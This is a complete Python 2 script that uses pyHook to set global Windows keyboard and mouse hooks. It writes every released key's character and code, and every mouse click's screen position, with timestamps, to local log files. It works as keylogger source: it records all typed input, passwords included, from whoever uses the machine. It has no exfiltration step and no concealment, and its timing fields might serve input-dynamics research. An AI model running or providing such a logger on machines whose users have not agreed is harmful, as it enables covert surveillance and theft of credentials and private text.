import pyHook, pythoncom, sys, time

file_log='C:\Users\Marshall\Desktop\log.txt'
def OnKeyboardEvent(event):

    fp=open("keylogs.txt","a")
    currentTime = time.time() - start
    fp.write("%.5f-" %currentTime)
    fp.write(chr(event.Ascii) + "-" + str(event.Ascii)+"\n")
    fp.close()    
    
    #logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s')
    #chr(event.Ascii)
    #logging.log(10,chr(event.Ascii))
    return True

def OnMouseEvent(event):
    fp=open("mouselogs.txt","a")
    currentTime = time.time() - start
    fp.write("%.5f-" %currentTime)
    fp.write(str(event.Position[0]) + "," + str(event.Position[1]) + "-" + str(event.Message) + "\n")
    fp.close() 
    return True
start = time.time()    
hooks_manager = pyHook.HookManager ( )
hooks_manager.KeyUp = OnKeyboardEvent
hooks_manager.HookKeyboard ( )
hooks_manager.MouseAllButtonsDown = OnMouseEvent
hooks_manager.HookMouse ( )
pythoncom.PumpMessages () #pythoncom module is used to capture the key messages.